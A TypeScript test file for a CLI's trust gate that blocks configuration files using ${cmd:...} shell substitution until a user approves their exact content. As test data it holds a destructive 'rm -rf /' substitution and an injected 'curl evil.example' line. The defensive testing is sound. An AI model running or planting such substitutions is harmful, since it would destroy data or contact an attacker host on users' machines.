import * as os from 'node:os';
import * as path from 'node:path';
import * as fs from 'node:fs/promises';

import {
  trust,
  isTrusted,
  commandsIn,
  listTrusted,
  revokeTrust,
  untrustedMessage,
  trustedByEnvironment,
  usesCommandSubstitution,
} from '../../../src/config/command-trust.js';

/**
 * Approval for a configuration that runs commands.
 *
 * `${cmd:...}` executes a shell command when the configuration is read, so a
 * configuration file is executable code — and configuration files arrive by
 * `git clone`. Verified before this existed: cloning a repository and
 * running `xec config get` in it created a file on disk.
 */
describe('recognising a configuration that runs commands', () => {
  it('finds a command substitution', () => {
    expect(usesCommandSubstitution('vars:\n  sha: ${cmd:git rev-parse HEAD}\n')).toBe(true);
  });

  it('leaves an ordinary configuration alone', () => {
    // The gate must never ask about a configuration that runs nothing, or
    // it becomes a thing people dismiss without reading.
    expect(usesCommandSubstitution('vars:\n  name: app\n')).toBe(false);
    expect(usesCommandSubstitution('vars:\n  a: ${vars.b}\n  c: ${env.HOME}\n')).toBe(false);
  });

  it('ignores an escaped reference, as the interpolator does', () => {
    expect(usesCommandSubstitution('vars:\n  literal: \\${cmd:not-run}\n')).toBe(false);
  });

  it('lists what would run, so a human can decide about it', () => {
    // "This config runs commands" is not something anyone can judge.
    const content = 'a: ${cmd:git rev-parse HEAD}\nb: ${cmd:whoami}\nc: ${cmd:whoami}\n';

    expect(commandsIn(content)).toEqual(['git rev-parse HEAD', 'whoami']);
  });

  it('names the file and the commands in its message', () => {
    const message = untrustedMessage('/p/.xec/config.yaml', 'a: ${cmd:rm -rf /}\n');

    expect(message).toContain('/p/.xec/config.yaml');
    expect(message).toContain('rm -rf /');
    expect(message).toContain('xec config trust');
  });
});

describe('recording approval', () => {
  let home: string;
  let originalHome: string | undefined;
  const configPath = '/project/.xec/config.yaml';
  const content = 'vars:\n  sha: ${cmd:git rev-parse HEAD}\n';

  beforeEach(async () => {
    home = await fs.mkdtemp(path.join(os.tmpdir(), 'xec-trust-'));
    originalHome = process.env['HOME'];
    process.env['HOME'] = home;
  });

  afterEach(async () => {
    if (originalHome === undefined) delete process.env['HOME'];
    else process.env['HOME'] = originalHome;
    await fs.rm(home, { recursive: true, force: true });
  });

  it('starts with nothing approved', async () => {
    expect(await isTrusted(configPath, content)).toBe(false);
  });

  it('remembers an approval', async () => {
    await trust(configPath, content);

    expect(await isTrusted(configPath, content)).toBe(true);
  });

  it('does not carry approval to edited content', async () => {
    // The whole point: approving a configuration approves what it said, not
    // the path. Otherwise one approval covers whatever is written there next.
    await trust(configPath, content);

    expect(await isTrusted(configPath, `${content}  extra: \${cmd:curl evil.example}\n`)).toBe(false);
  });

  it('does not carry approval to another file with the same content', async () => {
    await trust(configPath, content);

    expect(await isTrusted('/elsewhere/.xec/config.yaml', content)).toBe(false);
  });

  it('withdraws approval whatever content was approved', async () => {
    await trust(configPath, content);
    await trust(configPath, `${content}  more: 1\n`);

    expect(await revokeTrust(configPath)).toBe(2);
    expect(await isTrusted(configPath, content)).toBe(false);
  });

  it('reports nothing removed for a file that was never approved', async () => {
    expect(await revokeTrust('/never/.xec/config.yaml')).toBe(0);
  });

  it('writes the store owner-only', async () => {
    // It is a list of code this user has agreed to run; another user being
    // able to append to it would be the whole gate.
    await trust(configPath, content);
    const stat = await fs.stat(path.join(home, '.xec', 'trusted-configs.json'));

    expect(stat.mode & 0o777).toBe(0o600);
  });

  it('lists approvals newest first', async () => {
    await trust('/a/.xec/config.yaml', content, new Date('2026-01-01T00:00:00Z'));
    await trust('/b/.xec/config.yaml', content, new Date('2026-06-01T00:00:00Z'));

    expect((await listTrusted()).map(e => e.path)).toEqual([
      path.resolve('/b/.xec/config.yaml'),
      path.resolve('/a/.xec/config.yaml'),
    ]);
  });

  it('treats an unreadable store as nothing approved', async () => {
    // Fails closed. A corrupt store must not read as blanket approval.
    await fs.mkdir(path.join(home, '.xec'), { recursive: true });
    await fs.writeFile(path.join(home, '.xec', 'trusted-configs.json'), 'not json');

    expect(await isTrusted(configPath, content)).toBe(false);
  });
});

describe('the environment escape hatch', () => {
  it('accepts the two spellings a pipeline would use', () => {
    expect(trustedByEnvironment({ XEC_TRUST_CONFIG: '1' })).toBe(true);
    expect(trustedByEnvironment({ XEC_TRUST_CONFIG: 'true' })).toBe(true);
  });

  it('is off unless set, and off for anything else', () => {
    expect(trustedByEnvironment({})).toBe(false);
    expect(trustedByEnvironment({ XEC_TRUST_CONFIG: '0' })).toBe(false);
    expect(trustedByEnvironment({ XEC_TRUST_CONFIG: 'yes' })).toBe(false);
  });
});
